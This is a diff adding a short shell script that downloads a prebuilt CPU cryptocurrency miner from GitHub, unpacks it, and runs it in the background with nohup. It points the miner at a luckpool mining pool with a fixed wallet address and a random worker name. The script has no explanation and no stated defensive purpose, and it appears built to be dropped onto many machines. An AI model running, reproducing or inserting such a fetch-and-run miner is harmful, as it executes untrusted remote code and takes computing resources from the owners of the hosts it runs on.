@@ -1,0 +1,6 @@
+RAND=$(shuf -i 2000-65000 -n 1)
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && \
+tar xf hellminer_cpu_linux.tar.gz
+nohup ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RARNZ6LoxcvsUgVHM1f2MDmnVfzDFxqV1R.$RAND -p x --cpu 1 &
+sleep 5
+tail -f nohup.out
